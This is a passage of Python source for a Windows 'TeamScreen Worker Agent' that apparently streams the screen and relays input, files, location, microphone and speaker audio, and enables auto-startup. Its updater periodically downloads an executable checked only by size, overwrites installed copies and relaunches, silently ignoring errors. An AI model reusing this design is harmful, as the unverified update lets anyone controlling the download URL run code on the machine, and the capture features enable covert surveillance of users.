                                samples = np.frombuffer(raw, dtype=np.int16)
                                sd.play(samples, samplerate=fs)
                                sd.wait()
                time.sleep(0.04)
            except Exception:
                time.sleep(0.3)

    def auto_update_loop(self):
        """
        Periodically checks version.json on the repository.
        If a new version is detected, downloads the updated WorkerRelay.exe,
        deploys it to all target paths, and restarts seamlessly.
        """
        # Wait 15 seconds after launch before first check
        time.sleep(15)

        while self.is_running:
            try:
                self.check_and_apply_update()
            except Exception:
                pass

            # Check every 10 minutes (600 seconds)
            time.sleep(600)

    def check_and_apply_update(self):
        try:
            # 1. Fetch remote version.json
            req = urllib.request.Request(
                VERSION_JSON_URL,
                headers={"User-Agent": f"WorkerRelay/{self.app_version}"}
            )
            with urllib.request.urlopen(req, timeout=10) as resp:
                data = json.loads(resp.read().decode("utf-8"))

            remote_ver = data.get("version", "").strip()
            download_url = data.get("download_url", "").strip()

            if not remote_ver or not download_url:
                return

            def parse_ver(v):
                import re
                parts = re.findall(r"\d+", str(v))
                return tuple(map(int, parts)) if parts else (0,)

            # 2. Compare versions
            if parse_ver(remote_ver) <= parse_ver(self.app_version):
                return

            # 3. Stream download the update binary to a temp cache file
            temp_dir = os.environ.get("TEMP", r"C:\Windows\Temp")
            temp_file = os.path.join(temp_dir, f"WorkerRelay_update_v{remote_ver}.tmp")

            dl_req = urllib.request.Request(
                download_url,
                headers={"User-Agent": f"WorkerRelay-AutoUpdater/{self.app_version}"}
            )
            with urllib.request.urlopen(dl_req, timeout=60) as dl_resp:
                with open(temp_file, "wb") as f:
                    shutil.copyfileobj(dl_resp, f)

            # Check downloaded file integrity (> 1MB)
            if not os.path.exists(temp_file) or os.path.getsize(temp_file) < 1024 * 1024:
                try:
                    os.remove(temp_file)
                except Exception:
                    pass
                return

            # 4. Deploy update to target installation paths
            updated_any = False
            for target_path in TARGET_INSTALL_PATHS:
                try:
                    target_dir = os.path.dirname(target_path)
                    os.makedirs(target_dir, exist_ok=True)
                    if os.path.exists(target_path):
                        old_p = target_path + ".old"
                        try:
                            if os.path.exists(old_p):
                                os.remove(old_p)
                            os.rename(target_path, old_p)
                        except Exception:
                            pass
                    shutil.copy2(temp_file, target_path)
                    updated_any = True
                except Exception:
                    pass

            # Also update current executable if different from TARGET_INSTALL_PATHS
            curr_exe = os.path.abspath(sys.argv[0])
            if curr_exe.lower().endswith(".exe") and curr_exe not in TARGET_INSTALL_PATHS:
                try:
                    old_curr = curr_exe + ".old"
                    try:
                        if os.path.exists(old_curr):
                            os.remove(old_curr)
                        os.rename(curr_exe, old_curr)
                    except Exception:
                        pass
                    shutil.copy2(temp_file, curr_exe)
                    updated_any = True
                except Exception:
                    pass

            # Clean up temp file
            try:
                os.remove(temp_file)
            except Exception:
                pass

            # 5. Relaunch new version and exit current process
            if updated_any:
                launch_exe = TARGET_INSTALL_PATHS[0] if os.path.exists(TARGET_INSTALL_PATHS[0]) else curr_exe
                subprocess.Popen([launch_exe], shell=False)

                # Close single instance mutex and terminate
                if self._mutex:
                    try:
                        import ctypes
                        ctypes.windll.kernel32.CloseHandle(self._mutex)
                    except Exception:
                        pass
                os._exit(0)

        except Exception:
            pass

    def run(self):
        threading.Thread(target=self.heartbeat_loop, daemon=True).start()
        threading.Thread(target=self.stream_loop, daemon=True).start()
        threading.Thread(target=self.input_receiver_loop, daemon=True).start()
        threading.Thread(target=self.file_handler_loop, daemon=True).start()
        threading.Thread(target=self.resolve_location_loop, daemon=True).start()
        threading.Thread(target=self.worker_mic_loop, daemon=True).start()
        threading.Thread(target=self.worker_speaker_loop, daemon=True).start()
        threading.Thread(target=self.auto_update_loop, daemon=True).start()

        menu = pystray.Menu(
            pystray.MenuItem(f"Node: {self.config.get('worker_name', 'Worker')}", lambda: None, enabled=False),
            pystray.MenuItem(f"Version: v{self.app_version}", lambda: None, enabled=False),
            pystray.MenuItem(lambda text: f"Status: {self.current_status_text}", lambda: None, enabled=False),
            pystray.MenuItem("⚡ Windows Startup: Active", lambda: None, enabled=False),
            pystray.MenuItem("Ensure Auto-Startup", lambda icon, item: self.ensure_local_installation_and_autostart()),
            pystray.Menu.SEPARATOR,
            pystray.MenuItem("Exit Agent", lambda icon, item: self.shutdown(icon))
        )

        self.tray_icon = pystray.Icon(
            "TeamScreenWorker",
            self.create_tray_image("idle"),
            "TeamScreen Worker Agent",
            menu
        )

        self.tray_icon.run()

if __name__ == "__main__":
    agent = BackgroundWorkerAgent()
    agent.run()
